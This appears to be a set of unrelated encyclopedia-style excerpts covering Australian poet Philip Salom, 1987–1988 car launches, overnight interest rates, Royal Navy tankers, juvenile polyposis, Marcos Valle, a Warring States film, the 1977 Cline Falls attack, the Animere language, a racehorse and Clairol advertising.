Salom‚Äôs prose, poetic and frequently playful, bestows a multiplicity of incidental insights en route, yet never condescends to its subjects nor patronises its readers. As rollicking as it is original and affecting, Waiting is a highly readable addition to Australian literature.' (Miles Franklin.) 'The novel vibrates with the language of the street and the speaking voices of the many characters is brilliantly captured by Salom, whose poetry background is apparent. The suburban rooming house which is central to the novel reverberates with wit and intensity and the cast of characters that live and die in this boarding house is achingly authentic. Their impoverished circumstances, daily struggles with health and mental capacity are all handled with sensitivity and a unique voice.' The Returns was shortlisted for the 2020 Miles Franklin Award. Philip Salom has performed as a guest writer and lecturer in the United States, Canada, United Kingdom, Italy, Yugoslavia, Singapore and New Zealand. Bibliography Poetry *The Silent Piano.

The automotive industry designs, develops, manufactures, markets, and sells motor vehicles. United Kingdom The Rover Group's Leyland Bus division became the independent Leyland Bus company as the result of a management buyout. Ford released a facelifted version of the Sierra in February, updating the styling and adding a saloon version - the Sierra Sapphire. The 1.3 petrol engine was replaced with a 1.8 petrol engine, while the Peugeot 2.3 diesel was replaced by Ford's own 1.8 diesel. The old style Sierra was briefly maintained - and the three-door version reintroduced - for a limited run of high performance Sierra Cosworths capable of 150 mph. The MK2 Fiesta enjoyed its best sales year in the UK with over 150,000 sold. Jaguar brought out a redesigned version of its XJ Series saloon range, which included a new \\"Sovereign\\" version. France PSA made two car launches during 1987. The first was the 5-door version of the Citro√´n AX, a small hatchback based around the running gear of the Peugeot 205. It went on sale across Europe in the Summer replacing the Visa. At the end of the year, PSA launched its Peugeot 405 family saloon, which replaced the long-running 305. With its Pininfarina-styled bodyshell, the new car won the European Car of the Year award by a record margin. The saloon version was assembled at the Ryton plant near Coventry, while the forthcoming estate was to be assembled in France. UK sales began in January 1988. Italy In the \\"Type Four\\" platform a fourth and final car was launched, the Alfa Romeo 164. Powered by a 3.0 V6 engine, the new four-door saloon was launched in the same sector as the BMW 5 Series and Audi 100. Its Pininfarina-designed body bore a resemblance to Peugeot's new 405, with a redesigned interior. A smaller-engined version was also planned. Eastern Europe Three years after it was launched in the USSR, the Lada Samara was imported to Western Europe. With 1.1 and 1.3 engines initially, (a 1.5 version came in 1988), the range included three- and five-door hatchback bodystyles. Japan In Japan Honda launch of a redesigned Honda Prelude. The current version debuted in 1983, and the latest version had a VTEC engine. Toyota brought out the latest version of their Corolla family car. Mazda launched a new entrant into the mini-car market - the 121. Similar in size to the Ford Fiesta, it offered more headroom and legroom within a redesigned high-roofed body. Three and five-door hatchback bodystyles were on offer.

In some countries (the United States of America, for example), the overnight rate may be the rate targeted by the central bank to influence monetary policy. In most countries, the central bank is also a participant on the overnight lending market, and will lend or borrow money to some group of banks. There may be a published overnight rate that represents an average of the rates at which banks lend to each other; certain types of overnight operations may be limited to qualified banks. The precise name of the overnight rate will vary from country to country. Background Throughout the course of a day, banks will transfer money to each other, to foreign banks, to large clients, and other counterparties on behalf of clients or on their own account. At the end of each working day, a bank may have a surplus or shortage of funds (or a shortage or excess reserves in fractional reserve banking). Banks that have surplus funds or excess reserves may lend them (often at a multiple of their legal reserve ratio, if any) or deposit them with other banks, who borrow from them. The overnight rate is the amount paid to the bank lending the funds. Banks will also choose to borrow or lend for longer periods of time, depending on their projected needs and opportunities to use money elsewhere. Most central banks will announce the overnight rate once a month. In Canada, for example, the Bank of Canada sets a target bandwidth for the overnight rate each month of +/- 0.25% around its target overnight rate: the Bank of Canada does not interfere in the overnight market so long as the overnight rate stays within its target band, but the Bank will use its reserves to lend or borrow in the overnight market to ensure that the overnight rate stays within its announced bandwidth. Measure of liquidity Overnight rates are a measure of the liquidity prevailing in the economy. In tight liquidity conditions, overnight rates shoot up. Overnight rates may also shoot up due to lack of confidence amongst banks, as was observed in the liquidity crunch of 2008. In order to measure liquidity situation, the spread between risk-free rates and overnight rates is considered. The TED spread is a liquidity indicator for the U.S., which is the difference between LIBOR and Treasury bills.

Wave Ruler (background) refuels in the Pacific Ocean On 31 August 2008 Wave Ruler was dispatched with to assist relief efforts in the Caribbean for the Atlantic Hurricane Gustav. The vessels distributed food, water and first aid supplies to victims of the disaster as well as providing support restoring local infrastructure. On 3 October 2008 the ship docked in Havana, Cuba. This was only the second time since the country's revolution 50 years earlier that a Royal Navy ship had visited the country. The five-day stay was part of an ongoing anti-drugs operation in the Caribbean, which saw the ship spend much of 2005‚Äì2008 in the region, confiscating over of cocaine in total. On 8 November 2008 the ship was sent to the Cayman Islands to provide humanitarian relief assistance in the wake of Hurricane Paloma. In June 2009, she took part in exercise Bersama Shield with and off the Malay Peninsula. During February 2010, Wave Ruler and the destroyer were deployed to the Falkland Islands during a period of increased tension between the United Kingdom and Argentina over the former's plans to begin drilling for oil in the seas surrounding the islands. While in the South Atlantic, Wave Ruler took part in the rescue of an I-Kiribati sailor who was taken seriously ill, refuelling an RAF 1564 Search and Rescue Flight Sea King helicopter while in flight. The deployment also saw the ships visit Southern Thule in the Southern Sandwich Islands, the first British warships to visit the islands for nearly 10 years. November 2010 saw the vessel back in the Caribbean, where she distributed of fresh water and 32,000 water purification tablets in St Lucia after the effects of Hurricane Tomas. The deployment also saw the vessel visit Antigua and the British Overseas Territory of Grand Cayman. 2011‚Äìpresent Wave Ruler spent the summer and autumn of 2011 again in the Caribbean deployed as the United Kingdom's Atlantic Patrol Ship (North). She embarked a Mk 8 Lynx helicopter from 815 Naval Air Squadron for the duration. In October 2012, Wave Ruler transited the Suez Canal and took over from as Gulf Readiness Tanker in the Persian Gulf.

On 18 April 2009, Royal Navy personnel operating from Wave Knight in the Gulf of Aden managed to intercept and fend off two pirate attacks involving the vessels and using the ship's armament. At 0800, the ship received a distress call from MV Handy Tankers Magic indicating that they were under attack by pirates and requesting assistance. Arriving on the scene, Wave Knight gave chase to the pirate skiff and using its weapons as cover, held it and its 'mother boat' until the Dutch naval vessel HNLMS De Zeven Provincien arrived. 13 hostages were released and the pirates' weapons were destroyed. Within two hours, another distress call was received by Wave Knight from the vessel MV Front Ardennes, also under attack by pirates. Arriving to give support, the ship prevented the pirates from boarding the tanker, firing warning shots and causing the pirates to flee. With helicopters from the NATO task group ships HMCS Winnipeg and USS Halyburton, Wave Knight gave chase for six hours, until HMCS Winnipeg arrived, disarming the pirates.

Polyps are abnormal growths arising from a mucous membrane. These usually begin appearing before age 20, but the term juvenile refers to the type of polyp (i.e benign hamartoma, as opposed to adenoma for example), not to the age of the affected person. While the majority of the polyps found in juvenile polyposis syndrome are non-neoplastic, hamartomatous, self-limiting and benign, there is an increased risk of adenocarcinoma. Solitary juvenile polyps most commonly occur in the rectum and present with rectal bleeding. The World Health Organization criteria for diagnosis of juvenile polyposis syndrome are one of either: # More than five juvenile polyps in the colon or rectum; or # Juvenile polyps throughout the gastrointestinal tract; or # Any number of juvenile polyps in a person with a family history of juvenile polyposis.  Presentation  Age of onset is variable. The term 'juvenile' in the title of juvenile polyposis syndrome refers to the histological type of the polyps rather than age of onset. Affected individuals may present with rectal bleeding, abdominal pain, diarrhea or anemia. On colonoscopy or sigmoidoscopy polyps that vary in shape or size are present. The polyps can be sessile or pedunculated hamartomatous polyps.  Genetics  Juvenile polyposis syndrome can occur sporadically in families or be inherited in an autosomal dominant manner. Two genes associated with juvenile polyposis syndrome are BMPR1A and SMAD4. Gene testing may be useful when trying to ascertain which non-symptomatic family members may be at risk of developing polyps, however having a known familial mutation would be unlikely to change the course of treatment. A known mutation may also be of use for affected individuals when they decide to start a family as it allows them reproductive choices. While mutations in the gene PTEN were also thought to have caused juvenile polyposis syndrome, it is now thought that mutations in this gene cause a similar clinical picture to juvenile polyposis syndrome but are actually affected with Cowden syndrome or other phenotypes of the PTEN hamartoma tumor syndrome.  Screening  People with juvenile polyps may require yearly upper and lower endoscopies with polyp excision and cytology. Their siblings may also need to be screened regularly. Treatment Malignant transformation of polyps requires surgical colectomy.  Prognosis  Most juvenile polyps are benign; however, malignancy can occur. The cumulative lifetime risk of colorectal cancer is 39% in patients with juvenile polyposis syndrome.

He has produced works in many musical styles, including bossa nova, samba, and fusions of rock, soul, jazz, and dance music with Brazilian styles. Valle is regarded as one of the greatest Brazilian artists of all time. Early career Valle's talent was evident from his high school years, which coincided with the explosion of the bossa nova movement in Rio. His classmates included future legends such as Edu Lobo and Dori Caymmi, and his composition \\"Sonho de Maria\\" was included on the Avanco album by the influential Tamba Trio in 1963. With his brother Paulo Sergio Valle as his lyricist, he had already built an impressive portfolio of songs, prompting Odeon Records (a subsidiary of EMI) to sign him as a singer. His debut album Samba \\"Demais\\", was released in April 1964. His reputation quickly spread, and his fellow musicians (including Wilson Simonal, Elis Regina, and Nara Le√£o) lined up to record his songs. A second album, O Compositor e o Cantor, followed in 1965, and featured what would become his most recognisable song, \\"Samba De Ver√£o\\" ‚Äì known in English as \\"So Nice (Summer Samba)\\" ‚Äì along with other hits such as \\"Deus Brasileiro,\\" \\"Gente\\", and \\"A Resposta\\". Nineteen sixty-six brought Valle's first trip to the United States, where he and his then-wife Anamaria briefly teamed up with S√©rgio Mendes in an early version of what would later become Brasil '66. The threat of being drafted and sent to Vietnam caused Valle to return quickly to Brazil, although the following year saw him back to the United States and enjoying some success, including the release of his U.S. debut album, Braziliance!, on Warner Bros. Records, and several appearances on the Andy Williams TV show. Following session work on Verve Records releases by compatriots Walter Wanderley and Astrud Gilberto, the label released Valle's Samba '68 featuring English-language versions of songs from his earlier Brazilian releases. Shortly thereafter, feeling homesick, Valle returned to Brazil and entered a new creative phase. Viola Enluarada (1968) was more mature and introspective, far removed from the frothy feel of Samba '68. The title track was a duet with Milton Nascimento and became one of Valle's signature compositions in Brazil. It also betrayed a political consciousness largely absent from Valle's previous work ‚Äì he would become more overtly political in the years to come. The album as a whole pointed to a broader range of musical influences (particularly the Northeastern Brazilian styles he had enjoyed listening to since his childhood days) that moved him out of the \\"strictly 'bossa nova artists' club.\\" This process continued on 1969's Mustang Cor de Sangue ou Corcel Cor de Mel, another leap forward that incorporated rock, soul and pop idioms, all stamped with Valle's own melodic style. His work on the album reflected the sophisticated pop approach of American songwriters such as Jimmy Webb and Burt Bacharach as well as the influence of The Beatles. Around this time, Valle began writing music for TV programs and telenovelas (soap operas), which over the next few years would become one of the main outlets for his work, along with advertising jingles. Marcos Valle (1970) (often referred to as The Bed Album due to its cover shot of Valle in bed) contained his most adventurous as well as his most rock-influenced and psychedelic music up to that point. Backed by Milton Nascimento's band Som Imaginario, Valle explored a more eccentric approach, with a number of futuristic tracks and an extended instrumental suite not unlike the work of U.S. composer and producer David Axelrod. Garra (1971) was a career highpoint that summed up his music and still stands as one of the finest pop albums of the era, Brazilian or otherwise. Its effervescent pop, jazz, soul, bossa, and film soundtrack stylings were matched by lyrics that attempted to reconcile Valle's hippie leanings with his status as a wealthy young musician who was also a successful businessman because of his successful novela soundtracks and corporate advertising accounts. Telenovelas he provided some or all of the music for during this period included O Cafona, Uma Rosa com Amor, Minha Doce Namorada, Pigmali√£o 70, Os Ossos do Bar√£o, and, most prominently, Selva de Pedra. He also wrote the score for the film O Fabuloso Fittipaldi (1973). Vento Sul (1972) found Valle long-haired and bearded, and backed by the progressive rock band O Ter√ßo. His most experimental effort to date (he even flirted with heavy metal on the song \\"Mi Hermoza\\"), it was a sales flop, although it has acquired admirers over the ensuing decades. The following year's innovative Previs√£o do Tempo fared better. It was made in conjunction with the band that initially formed to back Valle at live shows and named itself after one of his songs, Azimuth (soon to change the spelling to Azymuth). This album had a notable jazz fusion feel thanks to Valle's enthusiasm for the Fender Rhodes piano and Azymuth keyboardist Jose Roberto Bertrami's expertise on the Hammond organ and assorted synthesizers such as the Mini-Moog and the ARP Soloist. This sound would prove a decisive influence on the acid jazz scene in Europe twenty years later. Another innovation in Previs√£o do Tempo was the use of vocal percussion on the track \\"Mentira\\", ten years before hip-hop artists introduced beatboxing. Valle emulates a drum kit with his voice to perform a pattern and a fill. From 1972 to 1974, Valle provided the music for Vila S√©samo, Brazil's version of Sesame Street. In 1974, he also released his final album for Odeon, again self-titled. This album differed yet again from its predecessors in pursuing a piano-pop sound reminiscent in turns of Elton John, Todd Rundgren and Bread, and replete with elaborate vocal arrangements. Later career At this point, Valle had grown tired of the strictures of living and working under Brazil's military dictatorship, then in its darkest and bleakest phase. He therefore decided to return to the U.S., where he spent the rest of the decade. Settling in Los Angeles, he entered into collaborations with artists as diverse as Sarah Vaughan, Chicago, and R&B; singer and songwriter Leon Ware. Valle and Ware found themselves especially compatible, and wrote many songs together. Valle appeared on several of Ware's Elektra Records releases. Valle returned to Brazil in early 1980 and completed two albums, 1981's Vontade de Rever Voc√™, and 1983's Marcos Valle. These albums had prominent boogie, soul and funk influences. These had been present in Valle's work since the beginning of the 1970s and would be permanent influences on his music, also being solidified by his work with Leon Ware and Chicago. His single \\"Estrelar\\" (1982), a boogie dance track marketed as \\"workout music\\" at the time, proved to be his best-selling record ever with a total of about 90,000 copies sold. In 1984, he released another boogie single, \\"Bicicleta\\", but his recording label (Som Livre) decided to dismiss its entire cast and concentrate on soap opera LPs and Marcos was unable to complete a new album. His final album from the eighties was 1986's Tempo da Gente, after which he took a break from recording. Nevertheless he kept on playing gigs (something he did not do in his \\"Estrelar\\" days) and writing songs for many different artists such as Tim Maia, Roberto Carlos, and Ricky Martin. In the meantime, many listeners had become acquainted with Valle's work of the 1960s and 1970s, and his music started to find favour with European and American fans, as well as connoisseurs of dance music. Valle recorded a new album in 1999, Nova Bossa Nova, which reached back to his roots in bossa nova and added contemporary electronic influences to his music. At this point Valle had signed with the London-based Far Out Recordings, which specialised in Brazilian musicians such as Azymuth (his backing band on 1973's Previs√£o do Tempo) and Joyce. In 2001 Valle also produced two other discs, Live in Montreal with guitarist Victor Biglione and a backing band, and Bossa Entre Amigos, a release aimed at the Brazilian market that featured Valle sharing the bill with Brazilian guitarist and songwriter Roberto Menescal and singer-guitarist Wanda S√°. Escape, and especially its follow-up, Contrasts (released in 2003), showed increased electronic influences, mediated by London-based producer Roc Hunter. Valle showed on these releases that he was able to stay true to the roots of his sound while remaining open to modern influences and integrating them into his style. On 2005, Valle released Jet Samba, an all-instrumental collection featuring reworked compositions from past albums, as well as several new songs. In 2010, he released Est√°tica, an album which saw him return to a more organic approach, albeit with the use of some analog synthesisers. The record features expansive horn and string arrangements and has been referred to as a \\"masterpiece\\" by some. In 2011, he collaborated with the Phenomenal Handclap Band to contribute a version of the song \\"Tudo o Que Voc√™ Podia Ser\\" to the Red Hot Organization's fund-raising album Red Hot + Rio 2, proceeds from the sales of which were donated to fight AIDS/HIV. Valle continues to perform in Brazil and throughout Europe. Discography *1963: Samba \\"Demais\\" (Odeon) *1965: O Compositor e o Cantor (Odeon) *1966: Braziliance!

The automotive industry designs, develops, manufactures, markets, and sells motor vehicles. United Kingdom The newly independent Leyland Bus company was acquired by Volvo Buses. The remaining Rover Group business, which by now was mainly volume car production, was sold by the British Government to British Aerospace. The newly privatised Rover Group plc abandoned the Austin marque for its Mini, Metro, Maestro, and Montego ranges. Each model became badged as a Rover, joining the existing 200 and 800 ranges. The 800 Series gained a fastback model in May, effectively replacing the already discontinued SD1. The MG badge continued for high performance Metro, Maestro and Montego variants, and there was an updated version of the Metro in the pipeline, along with a reintroduction of the Mini Cooper nameplate as the Mini's 30th anniversary approached, with no plans to discontinue the small car nearly a decade after the launch of the Metro which was intended as its replacement. A replacement for the Metro was expected by 1990. Vauxhall brought out a new Cavalier in October competing with the Ford Sierra and Peugeot 405. Engines ranged from a 1.4 to a 2.0L, with most models getting power steering and electric windows as optional or standard equipment. There was no estate model. Germany Volkswagen launched the Passat in March. The Passat was available as a saloon and estate, starting with 1.6 petrol engines as well as a 1.9 turbo-diesel. For the first time in the Passat's 15-year history, there was no hatchback version. Volkswagen's other major launch of 1988 was the Corrado, a coupe which was to replace the Scirocco. It was powered by a 2.0 petrol engine from the Passat saloon. Audi launched a new Coupe, which ran alongside the original 1980 version. It used the same engines and transmission as the 80 saloon, with the option of Quattro four-wheel drive at the higher end of the range. Italy Winner of the year's Car of the Year award was the Fiat Tipo. A replacement for the older Strada, the Tipo was a tall five-door hatchback which offered more interior space for cars in the Ford Escort/Opel Kadett sector. It was powered by 1.4 and 1.6 engines in Britain and most other markets, as well as a 1.7 diesel. The home market also got a 1.1 version, plus the 1.8 and 2.0 versions. A saloon version was expected in 1989 as a replacement for the Strada-based Regata. Japan Toyota planned to launch their new Lexus brand. Its new brand would concentrate solely on luxury cars, and the LS 400 went on sale in 1989 to compete with the BMW 7 Series and Mercedes-Benz S-Class, powered by a 4.0 V8 engine.

Directed by Jacob Cheung, the film starred Andy Lau, Ahn Sung-ki, Wang Zhiwen, Fan Bingbing, Nicky Wu and Choi Siwon. This was a joint-production between mainland China, Hong Kong, Japan and South Korea.  Plot  The film is set in China in 370 BC during the Warring States period. A massive army from the Zhao state is on its way to attack the Yan state. Liang, a city-state on the Zhao‚ÄìYan border, is in peril of being conquered by the Zhao army. Ge Li, a Mohist, comes to Liang to help defend the city. Although the King of Liang has already planned for peace talks with the invaders, Ge Li manages to convince him and the people of Liang to put up resistance by warning them of the consequences of surrendering. He also promises the King that the invaders will give up on Liang if they fail to conquer it within a month, because their main target is actually the Yan state. The King has doubts about Ge Li's idea but still puts Ge in command of his army. Ge Li creates a bulwark and various traps to halt the Zhao army's advance. When he insists that Zituan lead the archers, Liang Shi (the Liang prince) is angered because he sees Zituan's archery skill as inferior to his. Even though Zituan later proves to be a better archer, Ge Li's style of working puts him at odds with Liang Shi and the other Liang generals. Ge Li also briefly meets Xiang Yanzhong, the commander-in-chief of the Zhao army, for a board game outside the city to understand each other better. During the first Zhao attack, Ge Li's defence tactics worked well‚Äîa Zhao general was killed and the invaders were forced to retreat‚Äîbut the Liang forces also suffered losses from a skirmish with Zhao infiltrators inside the city. Ge Li's success earns him the support of the people and he becomes a highly revered hero. Yiyue, a female cavalry commander, falls in love with Ge Li. However, Ge Li is reluctant to accept her feelings for him and tries to draw boundaries between them. One night, Ge Li and Yiyue scout the Zhao camp and discover that the enemy is digging tunnels to bypass their city's defences. Ge Li used that to his advantage by luring the Zhao soldiers into an ambush and then sealing the tunnel exits. The Liang general Niu Zizhang massacres the captured Zhao soldiers even though they were promised that their lives would be spared if they laid down their weapons. In the meantime, the King feels threatened when he sees Ge Li's growing popularity, so he plots to have Ge stripped off his post and executed on false charges. At the same time, the Liang forces receive news that the Zhao army has retreated. Ge Li plans to leave Liang since his mission is complete. He goes out to check that the Zhao army is indeed retreating. When he returns, he is stopped outside the gates and is accused of starting a war under false pretences and plotting to seize the throne. Just as the Liang soldiers are about to kill Ge Li, Liang Shi shows up, pretends to fight with Ge, and secretly tells Ge to take him hostage in order to buy time for Ge to escape. Ge Li manages to escape but Liang Shi is killed by a rain of arrows meant for Ge Li. Meanwhile, Ge Li's supporters, including Yiyue, are falsely accused of plotting a rebellion against the King and are arrested and tortured. Yiyue denounces the King and is sentenced to death. The King also has her rendered mute to prevent her from speaking up against him. Zituan refuses to turn against Ge Li, so he cuts off his right arm and leaves the Liang army. One night, just as Yiyue is about to be executed, the Zhao army launches a surprise attack and completely catches the Liang defenders off guard. She is taken back to the prison. Instead of focusing on fighting the invaders, the King orders his soldiers to kill those who try to escape from the city. Liang eventually falls to the Zhao army, and the King and his people are captured. Zituan and his archers manage to escape from Liang, and they join Ge Li outside the city. Xiang Yanzhong sends a message to Ge Li, in which he threatens to kill the people of Liang if Ge does not return to Liang to meet him. Ge Li returns to Liang alone and agrees to play the board game again with Xiang Yanzhong inside a tower. They agree that only the winner can leave the tower. Meanwhile, Zituan and his men flood the areas guarded by Zhao forces and launch an attack. Seeing that reinforcements have arrived, the people of Liang rise up against the Zhao invaders and succeed in defeating them and driving them out of the city. Xiang Yanzhong refuses to leave the tower because he feels that he has lost. After the battle, the King passes by the tower, sees Xiang Yanzhong, and orders Xiang to be killed. While the people of Liang rejoice in their victory, Ge Li rushes to the flooded prison to find Yiyue but arrives too late because she was unable to call out to him for help and has already drowned. Before the film ends, Ge Li leaves with some orphans to promote peace among the various warring states. The King of Liang meets his downfall five years later: The people can no longer stand his cruelty so they overthrow and execute him. Eventually, the Qin state conquers all the other states and unites China under the Qin dynasty.

After extensive experience as an Ambassador, Grimaldi served as Chief Minister of Spain between 1763 and 1778 helping to rebuild Spanish power following its defeat during the Seven Years' War. For his services as Secretary of State, he was granted the title of Duke of Grimaldi by king Charles III of Spain. Grimaldi was of Italian descent, and a member of the House of Grimaldi.  Biography  In the service of Spanish Kings Ferdinand VI and Charles III, Grimaldi was minister plenipotentiary in Sweden and Parma, and ambassador to the States-General of the United Provinces. Charles III named him ambassador to Paris, where together with French Secretary of State √âtienne Fran√ßois, duc de Choiseul he negotiated the third Family Compact between France and Spain. This provoked the entry of Spain into the war with Britain. He also signed the Peace of Paris in 1763. In September 1763, after the dismissal of Ricardo Wall he was named Spanish Minister of State, a position he held until 1776. He was a reformer, a member of the group known as golillas. Together with the Leopoldo de Gregorio, Marquis of Esquilache he helped suppress the 1766 riots provoked by Esquilache's reforms. (His house was sacked during the rioting.) He was a member of the junta that voted for the suppression of the Jesuits in 1767. In 1776, after various conflicts, particularly the defeat of the 1775 expedition to Algiers, he was removed from office and made ambassador in Rome. He was made grandee of Spain and decorated with the Order of the Golden Fleece, 1765.

The victims were two female college students, Terri Jentz and her roommate, Avra Goldman, who were on a cross- country cycling ride along the Trans America Trail. Both women decided to spend the night along the Deschutes River at the park near Redmond. During the night, they were awoken by a vehicle that drove over their tent, injuring both. The driver of the vehicle exited his car and proceeded to attack both women with an axe. Both women survived the attack, suffering significant injuries, but their attacker has never been positively identified. Timeline Background In the summer of 1977, 19-year-old Terri Jentz of Western Springs, Illinois, and her roommate, 20-year-old Avra Goldman of Wellesley, Massachusetts, were both Yale University students who decided to cycle across the United States via the newly-opened Trans America Trail. Upon completing their tour, which ended in Astoria, Oregon, both women headed east through the state. On the night of June 22, they stopped at the Cline Falls State Park in rural Deschutes County and decided to camp there overnight along the river. Jentz would later recall being unnerved by the location, and that both women felt as though they were being watched: \\"It was an animal instinct of danger, and we both had it, we both had it separately and we shared it with one another.\\" Attack Around 11:30 p.m., while both women were asleep in their tent, they were awoken by the sound of a truck pulling up to their campsite. Jentz initially believed the vehicle was driven by partying teenagers who had driven up to the campsite. The vehicle then proceeded to drive over the tent before stopping, its tires pinning Jentz to the ground at her chest, breaking both of her arms, one leg, her collarbone, and several ribs, as well as crushing her lung. A man exited the vehicle carrying an axe, and struck Goldman in the head with it around six times. After, the man stood over Jentz. She recalled: After Jentz begged the man, he returned to his vehicle and drove away. Though severely injured, Jentz managed to stumble to a nearby road, where she flagged down Bill Penhollow and Darlene Gervais, two teenagers who were passing by. Gervais recalled that Jentz was \\"so bloody it was dripping off her hair... the ends of her hair.\\" Penhollow and Gervais drove to the campsite to tend to Goldman, who was severely injured, and while doing so noticed a pair of headlights appear in the distance at the edge of the park, which frightened them as they assumed it to be the attacker returning to the scene. The vehicle, however, drove away. Investigation Initial response Police arrived at the Cline Falls campsite after midnight on June 23, and began investigating the scene. Police officers who inspected the scene examined tire marks left in the dirt; they determined the vehicle likely had two bald tires in the rear which were in width; one of the front tires was possibly bald, while the other had significant tread. Both Jentz and Goldman were taken to St. Charles Medical Center in Bend, where Goldman underwent a nine-hour emergency brain operation. Interviews and suspects Detectives were unable to obtain a rounded description of the attacker from the victims; Goldman, who had sustained serious brain trauma, remembered nothing of the attack. Jentz, who was conscious throughout, did not see the face of the assailant, but described him as a physically-fit, \\"young cowboy\\" based on his clothing and stature. In the weeks following the attack, a local woman in Redmond told authorities that she had been told that the attacker was a local young man named Richard \\"Dick\\" Damm (born November 10, 1959), then 17 years old. Damm was interviewed by detectives on several occasions, and it was discovered he had been in a fight with his girlfriend, Janey Fraley, around the date of the attack, though he never disclosed his specific whereabouts the night of June 22. Fraley denied that the two were fighting on that day, though she stated the two did fight often. After a polygraph examination taken by Damm proved inconclusive, he was given a second polygraph on July 14, 1977. The results of the second polygraph were shown to be \\"deceptive,\\" though the validity of these results were called into question when it was discovered Damm was under the influence of methamphetamine during the examination. The results of both polygraph examinations were subsequently analyzed by laboratories in Salem, the state capitol, and it was the opinion of the analysts that Damm showed deception in both. Fraley later told authorities that she had noticed Damm changed the tires on his truck shortly after the attack, and that a toolbox located in the truck bed had been removed. She also conceded to police that Damm had been abusive to her throughout their relationship. Another suspect in the attack was convicted child rapist and murderer Richard Wayne \\"Bud\\" Godwin. After the attack, Godwin was imprisoned for the murder of a five-year-old child, whose skull he used as a candle holder. On the night of Jentz and Goldman's attack, a female relative of Godwin'swith whom he had allegedly had a sexual relationshipwas possibly staying at the Cline Falls park. Despite law enforcement's considering of Godwin as a suspect, Jentz stated that he did not resemble the man she recalled attacking her. Later developments Both Jentz and Goldman survived their attack and recovered from their injuries, though Goldman was left with vision problems resulting from her head trauma. In September 1977, Goldman's parents donated $3,000 to St. Charles Medical Center into a fund for critical-care monitoring equipment under the names of Penhollow and Gervais, the two teenagers who found Jentz and Goldman and helped save them. In 2006, Jentz published a book recounting her life after the attack, titled Strange Piece of Paradise. While researching in preparation for the book, she discovered that the official records of the attack, including interviews, physical evidence, and crime scene photos, had been inadvertently lost.

It is most closely related to Kebu or Akebu of Togo. Both are Ghana Togo Mountain languages (GTM), classified as members of the Ka-Togo group by Heine (1968). Like most other GTM languages, Animere is a noun-class language. Animere is an endangered language which is no longer being passed on to children; the speaker count is approximately 30 (Blench 2006).Blench (2006) notes that all 30 speakers are over 35 years old. A 2003 Ethnologue estimate of 700 probably counts all ethnic Benimbere. Bodomo 1996:38 states that \\"Animere (...) is said to be dying out (only 250 speakers now)\\". Bodomo's figure probably derives from an older edition of the Ethnologue also cited by Sommer 1992. Already in 1965 Adele, another GTM language, was the dominant language among the younger generation in the Animere area, and only elderly people spoke Animere among themselves, leading Heine (1968) to expect that 'the language is going to be extinct in a few decades'.Heine (1968) says that only members of Nkwant√° and Kontr√¥ clans of the Benimbere speak (some) Animere; cf. Sommer 1992:308 Knowledge of Twi, a dominant regional language, is also widespread among the Benimbere. Footnotes References * Bodomo, Adams B.

It was released in 2006. Synopsis Terri Jentz and her friend Shayna Weiss (a pseudonym) are Yale students bicycling across America in 1977. On June 22, 1977, after stopping to camp at Cline Falls State Park in Oregon, they are brutally attacked when a man runs over the tent in which they are sleeping with a high-clearance pick-up truck and assaults them with an ax. Despite their injuries, both survive. Weiss suffers partial blindness and memory loss, and distances herself from the author. Jentz, her body scarred, bears her injuries mostly in guilt, anger, and fear. To help confront these feelings, Jentz returns to the area fifteen years later to investigate the crime even though the statute of limitations on attempted murder prevents her attacker's prosecution. During her investigation, she meets other victims of violent crimes and their advocates, who help her follow the most promising lead: a man whom locals have always suspected is the perpetrator. She learns that he, too, obsesses about the incident, frequently talking about the crime, and she even observes his polygraph session, in which he is asked about the attack on Jentz and Weiss, and attends his trial (which results in his conviction and sentencing for charges related to a different crime). However, she never speaks with him. For Jentz, the value of this exercise has been to break out of \\"the claustrophobic confines of [her] memories.\\" Television interviews *Jentz told part of her story in an interview for C-SPAN2 BookTV on 23 March 2007.

Background Henry of Navarre was sired by the 1884 Preakness Stakes winner Knight of Ellerslie he was named for the Huguenot king, Henry IV of France. He was purchased by trainer Byron McClelland. Racing career At age three Henry of Navarre won nine races in a row including the Belmont Stakes, in which he defeated another future Hall of Fame colt, Domino, who had beaten him in the Withers Stakes. After winning the Travers Stakes, his handlers and James R. Keene, owner of Domino, agreed to a match race in which the horses ended up in a dead heat. As such, they met again three weeks later in a race to determine the 1894 championship. For this championship event, the 4-year-old Clifford joined the two younger colts. Henry of Navarre beat his rivals by 3/4 length, earning Horse of the Year honors. In 1895 McLelland offered to match Henry of Navarre against any horse in the world over one mile for any sum from $5,000 to $25,000 at weight-for- age. Sold later in 1895 to prominent horseman August Belmont Jr., Henry of Navarre repeated as the U.S. Champion under future Hall of Fame trainer John Hyland. At age six, he was retired after winning the Suburban Handicap. Stud career Retired to stand at stud in France he met with little success and in 1911, along with several other horses, was donated to the U.S. Army Remount Service to help establish a national breeding program at the Front Royal, Virginia depot. In 1985, Henry of Navarre was posthumously inducted into the National Museum of Racing and Hall of Fame. A painting by Gene Smith of Henry of Navarre in his 1894 match race against Domino can be seen at the Museum.

He received his B.A. from Indiana University in 1914 and his M.A. from the same institution in 1916. During World War I, Buley served for a year in the U.S. Army Signal Corps.

As James Hall said: 'A human being may know how to read, and yet be a very stupid fellow....

History  In the 1950s, just 7% of American women used hair color (or admitted to doing so), at a time when the common belief was that only actresses, models and other women considered promiscuous altered their natural shade. To help change that attitude, Clairol eschewed celebrities in favor of the average woman for its Miss Clairol and Nice ‚Äôn Easy hair color campaigns. Chapter: \\"True Colors: Hair Dye and the Hidden History of Postwar America\\" The idea to buck the trend of that era‚Äôs advertising style ‚Äî which emphasized high glamour rather than girl-next-door vignettes ‚Äî was the brainchild of lead copywriter Shirley Polykoff, whose work on the Clairol hair color campaign was a career high point. In her original memo to Clairol, Polykoff, who was inducted into the Advertising Hall of Fame in 1980, described the Clairol woman as ‚ÄúCashmere-sweater-over-the-shoulder types.

